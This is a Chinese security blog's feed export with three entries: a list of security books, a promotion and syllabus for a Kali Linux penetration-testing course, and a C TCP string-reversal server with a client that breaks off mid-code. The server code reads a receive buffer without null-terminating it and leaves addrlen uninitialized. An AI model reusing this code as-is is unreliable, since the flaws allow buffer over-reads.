中文译文版》</a><br>《SQL注入攻击与防御（第2版）》<br>《SQL注入自学指南》<br>《上传攻击框架》<br>《上传验证绕过》<br>《Web安全测试》<br>《Web应用安全威胁与防治》<br>《Web应用程序安全手册》<br>《Web入侵安全测试与对策》<br>《Web安全深度剖析》<br>《Web之困：现代Web应用安全指南》<br>《Web应用安全权威指南》<br>《Web应用漏洞侦测与防御》<br>《白帽子讲Web安全》<br>《白帽子讲浏览器安全》<br>《Web前端黑客技术揭秘》<br>《安全之路-Web渗透技术及实战案例解析-第2版》<br>《黑客攻防技术宝典：Web实战篇（第2版）》<br>《黑客攻防技术宝典：浏览器实战篇》<br>《黑客大曝光：网络安全机密与解决方案（第7版）》<br>《代码审计:企业级Web代码安全架构》<br>《Kali Linux渗透测试的艺术》<br>《Kali Linux渗透测试实战》<br>《Kali Linux渗透测试技术详解》<br>《Kali Linux高级渗透测试》<br>《Web渗透测试：使用Kali Linux》<br>《Kali Linux &amp; BackTrack渗透测试实战》<br>《Kali Linux无线网络渗透测试详解》<br>《Metasploit渗透测试指南》<br>《Metasploit渗透测试魔鬼训练营》<br>《Wireshark 数据包分析实战(第2版)》<br>《渗透测试指南：必知必会的工具与方法》<br>《网络扫描技术揭秘：原理、实践与扫描器的实现》<br>《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》<br>《黑客大曝光：无线网络安全（原书第3版）》<br>《SRE：Google运维解密》<br>《企业linux安全运维理念和实战》<br>《日志管理与分析权威指南》<br>《Linux 服务器安全策略详解》<br>《Linux安全入侵防范检测和恢复》<br>《Linux防火墙（原书第三版）》<br>《网络安全监控实战 : 深入理解事件检测与响应》<br>《互联网企业安全高级指南》<br><a href="http://bobao.360.cn/news/detail/1132.html" target="_blank" rel="external">国外整理的一套在线渗透测试资源合集</a><br><a href="http://www.waitalone.cn/security-books-list.html" target="_blank" rel="external">信息安全学习购书清单</a></p><h2 id="0x02-拓展"><a href="#0x02-拓展" class="headerlink" title="0x02 拓展"></a>0x02 拓展</h2><p>《黑客大追踪：网络取证核心原理与实践》<br>《深入理解计算机系统（原书第2版）》<br>《计算机网络（第5版）》（注：清华大学出版社）<br>《社会工程：安全体系中的人性漏洞》<br>《反欺骗的艺术》<br>《反入侵的艺术》<br>《TCP/IP详解·卷2：实现》<br>《图解密码技术第3版》<br>《应用密码学：协议、算法与C源程序（原书第2版）》<br>《网络分析技术揭秘：原理、实践与WinPcap深入解析》<br>《网络渗透技术》<br>《Shellcoder编程揭秘》<br>《网络安全监控：收集、检测和分析》<br>《黑客免杀攻防》<br>《Java编程思想（第4版）》<br>《Java安全(第二版)》<br>《安全编程代码静态分析》<br>《Python灰帽子-黑客与逆向工程师的Python编程之道》<br>《电子数据取证》（注：清华大学出版社）<br>《数据隐藏技术揭秘：破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》<br>《数据驱动安全 : 数据安全分析、可视化和仪表盘》<br>《威胁建模 : 设计和交付更安全的软件》<br>《安全模式最佳实践》<br>《算法导论（原书第2版）》<br>《程序员的自我修养：链接、装载与库》<br>《代码整洁之道》<br>《程序员的怒吼》</p><p>最后送给大家一句自己在安全道路上的座右铭：发现大师，追随大师，成为大师，超越大师！</p>]]></content>
      
        <categories>
            
            <category> 干货分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 书籍推荐 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息安全书籍 </tag>
            
            <tag> 经典书籍 </tag>
            
            <tag> penetration tester books </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最优秀的Kali Linux渗透测试课程]]></title>
      <url>/2016/11/06/%E6%9C%80%E4%BC%98%E7%A7%80%E7%9A%84Kali-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/11/1368173888.jpg" alt="Kali Linux渗透测试.jpg"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>称为最优秀我个人觉得一点都不为过，目前市面上的那些课程先不说能不能把工具实现的原理讲清楚，就连工具的功能也是一知半解，更不说系统完整的渗透测试框架，yuanfh老师可能是我见过讲Kali Linux渗透测试最优秀的老师，很有幸学到老师的课程，老师讲课严谨细致的态度给我留下深深的印象，以致于每节课老师都讲了1个小时以上，老师在课程详细讲解渗透测试的方法、思路、工具原理，以及个人从事信息安全行业大量的经验和思考，个人觉得作为信息安全研究员，对知识不仅要知其然，更要知其所以然，讲究理论和实践结合，老师在课程花了大量的时间讲各种原理，做了许多的实例演示，让我从中学到了很多，再次向老师辛勤的付出说声谢谢！所以这里向静得下心研究安全的小伙伴们推荐，课程也不贵，至于课程质量我也过多赘述，可以先看看小伙伴们的<a href="http://edu.aqniu.com/course/83/reviews/?previewAs=member" target="_blank" rel="external">课程评价</a>。</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1337933913.png" alt="评论.png"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1418685955.png" alt="评论2.png"></p><h2 id="0x01-课程适合人群"><a href="#0x01-课程适合人群" class="headerlink" title="0x01 课程适合人群"></a>0x01 课程适合人群</h2><ul><li>渗透测试人员</li><li>网络与网络安全爱好者</li></ul><h2 id="0x02-课程目录"><a href="#0x02-课程目录" class="headerlink" title="0x02 课程目录"></a>0x02 课程目录</h2><p><strong>第1 章 ： 课程介绍</strong><br>课时1：Kali Linux渗透测试介绍 61:41<br><strong>第2 章 ： Kali安装</strong><br>课时2：Kali Linux安装-硬盘安装、虚拟机安装 85:22<br>课时3：Kali Linux 安装-持久加密USB安装、熟悉环境、熟悉BASH命令 78:14<br>课时4：Kali Linux安装-熟悉环境 106:52<br><strong>第3 章 ： 工作环境优化</strong><br>课时5：网络配置、更新升级、安装软件包、浏览器插件 61:24<br>课时6：安装Java、安装显卡驱动、安装网卡补丁、并发线程限制、电源优化 53:49<br>课时7：翻墙代理 101:35<br>课时8：TOR 73:31<br><strong>第4 章 ： 实验环境</strong><br>课时9：实验环境 107:39<br><strong>第5 章 ： 基本工具</strong><br>课时10：基本工具-NETCAT（telnet/banner、传输文本信息） 50:05<br>课时11：基本工具-NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘) 56:41<br>课时12：基本工具-远程控制、NCAT、WIRESHARK、WIRESHARK-筛选器、常见协议 75:55<br>课时13：基本工具-常见协议包、WIRESHARK-TCP 49:20<br>课时14：WIRESHARK-信息统计、实践 51:39<br>课时15：TCPDUMP-抓包、筛选、高级筛选、过程文档记录 80:26<br><strong>第6 章 ： 信息收集</strong><br>课时16：被动信息收集：信息收集内容、信息用途、信息收集DNS、DNS信息收集-NSLOOKUP 59:31<br>课时17：DNS信息收集-DIG 56:28<br>课时18：DNS区域传输、DNS字典爆破、DNS注册信息 64:49<br>课时19：搜索引擎、SHODAN 61:31<br>课时20：SHODAN 95:52<br>课时21：google搜索：实例 67:39<br>课时22：其他途径 46:58<br>课时23：RECON-NG 79:04<br><strong>第7 章 ： 主动信息收集</strong><br>课时24：主动信息收集-发现 67:20<br>课时25：主动信息收集-发现（二） 57:34<br>课时26：主动信息收集-发现（三） 65:33<br>课时27：主动信息收集-发现（四） 63:09<br>课时28：主动信息收集-发现（五） 76:03<br>课时29：端口扫描 81:40<br>课时30：端口扫描（二） 45:25<br>课时31：服务扫描 50:36<br>课时32：操作系统识别 78:43<br>课时33：SMB扫描 83:45<br>课时34：SMTP扫描 82:52<br><strong>第8 章 ： 弱点扫描</strong><br>课时35：弱点扫描 51:40<br>课时36：NMAP 145:22<br>课时37：NESSUS 111:53<br>课时38：NEXPOSE 99:22<br><strong>第9 章 ： 缓冲区溢出</strong><br>课时39：缓冲区溢出 57:54<br>课时40：POP3 68:58<br>课时41：FUZZING 122:26<br>课时42：Linux缓冲区溢出 96:13<br>课时43：选择和修改EXP 123:30<br><strong>第10 章 ： 提权</strong><br>课时44：本地提权 72:41<br>课时45：抓包嗅探 67:40<br>课时46：WCE 81:38<br>课时47：利用漏洞提权 113:29<br>课时48：利用配置不当提权 58:59<br>课时49：收集敏感数据、隐藏痕迹 63:32<br><strong>第11 章 ： 无线攻击</strong><br>课时50：无线渗透 62:17<br>课时51：无线网运行模式和无线网硬件设备及基本概念 61:32<br>课时52：无线技术概念 61:59<br>课时53：Linux 无线协议栈及配置命令 60:06<br>课时54：RADIOTAP头部 66:08<br>课时55：CONTROL FRAME 88:37<br>课时56：MANAGEMENT FRAME 管理帧 63:46<br>课时57：REASSOCIATION REQUEST FRAME 94:32<br>课时58：WEP加密、RC4算法 26:59<br>课时59：WPA安全系统 67:12<br>课时60：密钥交换、无线渗透实操：AIRCRACK-NG基础、AIRODUMP-NG排错 106:07<br>课时61：AIREPLAY-NG 52:39<br>课时62：Mac地址绑定攻击 127:14<br>课时63：WPA 106:47<br>课时64：COWPATTY 破解密码 51:45<br>课时65：WPS 52:27<br>课时66：WPS及其他工具 86:21<br>课时67：EVIL TWIN AP、ROGUE AP 96:44<br>课时68：AIRRACK-NG SUITE 98:12<br>课时69：AIRRACK-NG(二) 93:52<br><strong>第12 章 ： 补充</strong><br>课时70：协议分析 125:13<br><strong>第13 章 ： Web渗透</strong><br>课时71：HTTP协议基础 79:57<br>课时72：扫描工具-Nikto 100:22<br>课时73：vega 114:34<br>课时74：skipfish 99:48<br>课时75：w3af 75:32<br>课时76：w3af-身份认证 68:05<br>课时77：w3af-截断代理 79:26<br>课时78：Arachni 108:09<br>课时79：OWASP_ZAP 137:17<br>课时80：Burpsuite 88:56<br>课时81：Burpsuite-intruder 82:18<br>课时82：Burpsuite-repeater，Sequencer，编码，代理截断工具 53:42<br>课时83：ACUNETIX WEB VULNERABILITY SCANNER 129:01<br>课时84：APPSCAN 83:55<br>课时85：答疑（Conky、Goagent、Linux4.4内核发布）,手动漏洞挖掘 91:09<br>课时86：手动漏洞挖掘（二） 112:24<br>课时87：手动漏洞挖掘（三） 102:33<br>课时88：手动漏洞挖掘（四） 71:33<br>课时89：KALI版本更新（第一个ROLLING RELEASE）和手动漏洞挖掘（SQL注入） 126:29<br>课时90：手动漏洞挖掘-SQL注入 76:23<br>课时91：手动漏洞挖掘-SQL注入 130:31<br>课时92：手动漏洞挖掘-SQL盲注 93:11<br>课时93：SQLMAP- 自动注入 125:59<br>课时94：SQLMAP自动注入-REQUEST 80:58<br>课时95：SQLMAP自动注入（二）-REQUEST和SQLMAP自动注入（三）-OPTIMIZATION 79:36<br>课时96：SQLMAP自动注入-INHECTION、DETECTION、TECHNIQUES、FINGERPRINT 62:43<br>课时97：SQLMAP自动注入-ENUMERATION、BRUTE FORCE、UDF INJECTION、FILE SYSTEM、OS、WINDOWS REGISTORY、GENERAL、MISCELLANEOUS 72:49<br>课时98：XSS-简介、跨站脚本检测和常见的攻击利用手段 98:59<br>课时99：XSS- 键盘记录器和反射型XSS 81:01<br>课时100：存储型XSS和BEEF浏览器攻击框架 136:24<br>课时101：CSRF 70:07<br>课时102：WEBSHELL 70:42<br>课时103：HTTPS攻击 120:58<br>课时104：SSL、TLS中间人攻击 117:54<br>课时105：SSL、TLS拒绝服务攻击和补充概念 97:49<br><strong>第14 章 ： 密码破解</strong><br>课时106：思路、身份认证方法、密码破解方法、字典 119:51<br>课时107：字典、在线密码破解-hydra 118:37<br>课时108：在线密码破解-hydra、在线密码破解-medusa、离线密码破解 72:10<br>课时109：离线密码破解、离线密码破解-Hashcat 90:14<br>课时110：离线密码破解 121:21<br>课时111：密码嗅探（第四版剪辑版） 121:40<br>课时112：密码嗅探、中间人攻击 88:26<br>课时113：中间人攻击、ARP MITM、中间人攻击、Pass the Hash 127:54<br><strong>第15 章 ： 流量操控与隧道</strong><br>课时114：流量操控技术、重定向 115:59<br>课时115：SSH隧道和SSH本地端口转发 94:12<br>课时116：SSH远程端口转发和动态端口转发以及X协议转发 61:06<br>课时117：DNS协议隧道、DNS协议隧道-dns2tcp 172:36<br>课时118：DNS协议隧道-dns2tcp 48:33<br>课时119：DNS协议隧道-iodine、NCAT 114:15<br>课时120：COCAT 48:12<br>课时121：ptunnle 55:32<br>课时122：proxytunnle 103:57<br>课时123：sslh 74:00<br>课时124：补充Proxytunnel、stunnel4 65:40<br><strong>第16 章 ： 拒绝服务</strong><br>课时125：拒绝服务介绍、DoS分类、个人DoS分类方法 126:38<br>课时126：Syn-Flood、IP地址欺骗 135:56<br>课时127：Smurf攻击、Sockstress 108:30<br>课时128：TearDrop 77:04<br>课时129：DNS放大攻击 43:55<br>课时130：SNMP放大攻击 60:32<br>课时131：NTP放大攻击 37:18<br>课时132：应用层Dos 146:02<br>课时133：拒绝服务攻击工具-RUDY、Hping3、LAND攻击、Siege 108:59<br>课时134：拒绝服务攻击工具-NMAP、匿名者拒绝服务工具包（匿名者发布的DoS工具）、其他拒绝服务工具-XOIC、HULK、DDOSIM、GoldenEye 86:39<br><strong>第17 章 ： 免杀</strong><br>课时135：恶意软件、防病毒软件、免杀技术、当前现状 118:44<br>课时136：当前现状、软件保护，自己编写后门 106:54<br>课时137：Veil-evasion 87:41<br>课时138：Veil-catapult 88:11<br>课时139：Veil-catapult总结、另一种免杀思路、shellter 54:12<br>课时140：Backdoor-factory 98:43<br>课时141：Bdfproxy 98:36<br><strong>第18 章 ： Metasploit Framework</strong><br>课时142：渗透测试者的困扰 38:20<br>课时143：Metasploit简介、教材和版本对比 39:15<br>课时144：Metasploit Framework 和MSF架构 26:16<br>课时145：MSF架构-技术功能模块 45:00<br>课时146：MSF基本使用和控制台命令 68:37<br>课时147：MSF-控制台命令 89:28<br>课时148：Exploit 模块 45:27<br>课时149：生成 payload 42:19<br>课时150：Meterpreter 27:20<br>课时151：Meterpreter 基本命令和Meterpreter Python扩展 86:32<br>课时152：Msfcli 11:37<br>课时153：Msf-信息收集 发现和端口扫描 17:55<br>课时154：Msf-信息收集 IPID Idle扫描和UDP扫描 15:54<br>课时155：Msf-信息收集 密码嗅探和SNAP扫描 31:36<br>课时156：Msf-信息收集 SMB服务扫描 25:22<br>课时157：Msf-信息收集 SSH服务扫描 10:24<br>课时158：Msf-信息收集 系统补丁 16:46<br>课时159：Msf-信息收集 sql serve 17:14<br>课时160：Msf-信息收集 FTP 05:16<br>课时161：Msf-弱点扫描 81:28<br>课时162：Msf-弱点扫描 和客户端渗透 80:05<br>课时163：Msf-客户端渗透 131:50<br>课时164：Msf-后渗透测试阶段 85:56<br>课时165：Msf-后渗透测试阶段（二） 102:05<br>课时166：Msf-后渗透测试阶段（三） 62:04<br>课时167：Msf-后渗透测试阶段（四） 84:08<br>课时168：Msf-后渗透测试阶段（五） 94:41<br>课时169：Msf-后渗透测试阶段（六） 61:19<br>课时170：Msf-后渗透测试阶段（七） 71:57<br>课时171：Msf-后渗透测试阶段（八） 121:37<br>课时172：Armitage图形化端-简介安装 86:15<br>课时173：Armitage 图形化前端-启动、发现主机、工作区、获取目标 136:30<br>课时174：新闻插播和社会工程学 124:41<br><strong>第19 章 ： 电子取证</strong><br>课时175：取证科学简介、分类、通用原则、取证方法、取证工具 93:23<br>课时176：取证工具和Volatility插件 141:49<br>课时177：活取证和死取证 126:42</p><h2 id="0x03-课程链接"><a href="#0x03-课程链接" class="headerlink" title="0x03 课程链接"></a>0x03 课程链接</h2><p><a href="http://edu.aqniu.com/course/83" target="_blank" rel="external">Kali Linux渗透测试</a></p>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 最好的 </tag>
            
            <tag> 课程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux平台C语言Socket编程练习之TCP套接字]]></title>
      <url>/2016/11/03/Linux%E5%B9%B3%E5%8F%B0C%E8%AF%AD%E8%A8%80Socket%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E4%B9%8BTCP%E5%A5%97%E6%8E%A5%E5%AD%97/</url>
      <content type="html"><![CDATA[<h2 id="0x00-要求"><a href="#0x00-要求" class="headerlink" title="0x00 要求"></a>0x00 要求</h2><p>实现一个基于TCP协议的服务器-客户端程序，要求完成以下功能。</p><p><strong>服务端：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">接收客户的连接请求，并发送欢迎信息，显示客户的IP地址和端口号；</div><div class="line"></div><div class="line">循环接收接收客户传来的字符串，反转后传递给客户；</div></pre></td></tr></table></figure><p><strong>客户端：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">从命令行读入服务器的IP地址；并连接到服务器；</div><div class="line"></div><div class="line">循环从命令行读入一行字符串，并传递给服务器，由服务器对字符串反转，并将结果返回客户程序，如果用户输入的是quit，则关闭连接；</div><div class="line"></div><div class="line">客户程序显示反转后的字符串；</div></pre></td></tr></table></figure><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p><strong>服务端：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXNUMCLINET 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> socketfd,bindfd,listenfd,connectfd,opt=SO_REUSEADDR;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num,send_num;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>,<span class="title">client</span>;</span></div><div class="line">    <span class="keyword">socklen_t</span> addrlen;</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE],send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> wel[]=<span class="string">"[*] Welcome! You can input 'quit' to exit:)"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((socketfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    setsockopt(socketfd,SOL_SOCKET,SO_REUSEADDR,&amp;opt,<span class="keyword">sizeof</span>(opt));</div><div class="line"></div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr.s_addr=htonl(INADDR_ANY);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((bindfd=bind(socketfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server)))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((listenfd=listen(socketfd,MAXNUMCLINET))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"listen() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((connectfd=accept(socketfd,(struct sockaddr *)&amp;client,&amp;addrlen))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"accept() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((send(connectfd,wel,<span class="keyword">sizeof</span>(wel),<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send welcome messages fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You got a connection from client IP:%s, PORT:%d\n"</span>,inet_ntoa(client.sin_addr),ntohs(client.sin_port));</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((recv_num=recv(connectfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Received string:%s\n"</span>,recv_buf);</div><div class="line"></div><div class="line">        <span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(recv_buf);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;(len/<span class="number">2</span>); ++i)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">char</span> tmp=recv_buf[i];</div><div class="line">            recv_buf[i]=recv_buf[len<span class="number">-1</span>-i];</div><div class="line">            recv_buf[len<span class="number">-1</span>-i]=tmp;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(send_buf,recv_buf);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Send reverse string:%s\n"</span>,send_buf);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(connectfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(send_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            close(connectfd);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(connectfd);</div><div class="line">    close(listenfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>客户端：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> socketfd;</div><div class="line">    <span class="keyword">ssize_t</span> send_num,recv_num;</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE],recv_buf[MAXDATASIZE],wel[MAXDATASIZE];</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">remote_host</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage:%s &lt;IP address&gt;\n"</span>,argv[<span class="number">0</span>]);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((remote_host=gethostbyname(argv[<span class="number">1</span>]))==<span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"gethostbyname() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((socketfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div 